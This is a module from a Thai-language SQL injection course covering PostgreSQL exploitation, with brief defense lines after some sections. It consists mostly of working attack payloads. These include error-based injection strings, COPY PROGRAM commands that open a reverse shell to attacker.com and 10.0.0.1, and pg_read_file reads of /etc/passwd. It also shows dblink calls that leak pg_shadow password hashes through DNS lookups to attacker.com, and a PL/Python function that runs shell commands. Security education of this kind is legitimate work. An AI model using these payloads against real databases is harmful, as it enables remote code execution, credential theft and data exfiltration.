# Part 087: Advanced PostgreSQL Techniques

## ภาพรวม

เทคนิคขั้นสูงสำหรับ PostgreSQL exploitation

**ขั้นตอนที่ 1376-1390**

---

## 1376. PostgreSQL Error-Based

```sql
-- Error-based ใน PostgreSQL

-- Technique 1: Invalid cast
' AND 1=CAST('a' AS INTEGER)-- -
-- Error: invalid input syntax for integer: 'a'

-- Technique 2: Division by zero
' AND 1/(SELECT 1 WHERE (SELECT user()) LIKE 'postgres')=1-- -

-- Technique 3: XML error
' AND 1=CAST(xpath('/','<x>' || (SELECT current_database()) || '</x>')::TEXT AS INTEGER)-- -

-- Technique 4: invalid XPATH
' AND extractvalue(1, concat(0x7e, (SELECT version())))-- -
-- (MySQL function, ไม่ทำงานใน PG)

-- PG specific error extraction:
' AND 1=CAST((SELECT string_agg(datname, ',') FROM pg_database) AS INTEGER)-- -
```

---

## 1377. PostgreSQL COPY PROGRAM

```sql
-- COPY PROGRAM สำหรับ OS command execution (superuser)

-- ดึงผล command:
COPY (SELECT '') TO PROGRAM 'id > /tmp/id.txt';
COPY cmd_output FROM PROGRAM 'cat /tmp/id.txt';
SELECT * FROM cmd_output;

-- Reverse shell:
COPY (SELECT '') TO PROGRAM 
  'bash -c ''bash -i >& /dev/tcp/attacker.com/4444 0>&1'' &';

-- ผ่าน SQL injection:
'; COPY (SELECT '') TO PROGRAM ''bash -c ''bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'' &''-- -

-- Defense:
REVOKE EXECUTE ON FUNCTION pg_catalog.pg_read_file FROM PUBLIC;
ALTER SYSTEM SET superuser_reserved_connections = 3;
-- ใช้ pg_hba.conf ควบคุม connection
```

---

## 1378. เข้าถึง File System

```sql
-- PostgreSQL สามารถอ่าน files (superuser)

-- อ่าน /etc/passwd:
SELECT pg_read_file('/etc/passwd', 0, 1000000);

-- อ่าน PostgreSQL config:
SELECT pg_read_file('postgresql.conf', 0, 100000);

-- List directory:
SELECT * FROM pg_ls_dir('/etc');

-- เขียน file (COPY):
COPY (SELECT 'test') TO '/var/lib/postgresql/data/test.txt';

-- ข้อมูล DB config:
SHOW data_directory;
SELECT current_setting('data_directory');
```

---

## 1379. dblink สำหรับ OOB

```sql
-- dblink: เชื่อมต่อ PostgreSQL อื่น
-- ใช้เป็น OOB exfiltration channel

-- Enable extension:
CREATE EXTENSION IF NOT EXISTS dblink;

-- OOB via connection:
SELECT dblink_connect(
  'host=' || (SELECT version()) || '.attacker.com dbname=evil user=foo'
);
-- -> DNS lookup: 'PostgreSQL 14.x ....attacker.com'

-- Exfiltrate ข้อมูล:
SELECT dblink_connect(
  'host=' || (SELECT string_agg(usename || ':' || passwd, ',') FROM pg_shadow) || '.attacker.com'
);
-- -> DNS lookup มี credentials!

-- Defense:
REVOKE EXECUTE ON FUNCTION dblink_connect FROM PUBLIC;
DROP EXTENSION IF EXISTS dblink;
```

---

## 1380. PL/Python Abuse

```sql
-- PL/Python: เรียก Python code ใน PostgreSQL
-- ต้อง superuser และ plpython3u extension

-- Enable:
CREATE EXTENSION IF NOT EXISTS plpython3u;

-- OS command via PL/Python:
CREATE OR REPLACE FUNCTION exec_os(cmd TEXT) RETURNS TEXT
LANGUAGE plpython3u AS $$
import subprocess
result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
return result.stdout
$$;

-- เรียกใช้:
SELECT exec_os('id');
SELECT exec_os('cat /etc/passwd');

-- Defense:
REVOKE EXECUTE ON FUNCTION exec_os FROM PUBLIC;
-- หรือไม่ติดตั้ง plpython3u
DROP EXTENSION IF EXISTS plpython3u;
```

---

## สรุป

Advanced PostgreSQL:
- **Error-based** - invalid cast, XML
- **COPY PROGRAM** - OS execution (superuser)
- **File system** - pg_read_file, COPY
- **dblink** - OOB DNS exfiltration
- **PL/Python** - Python code in DB

---

*Part 087 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
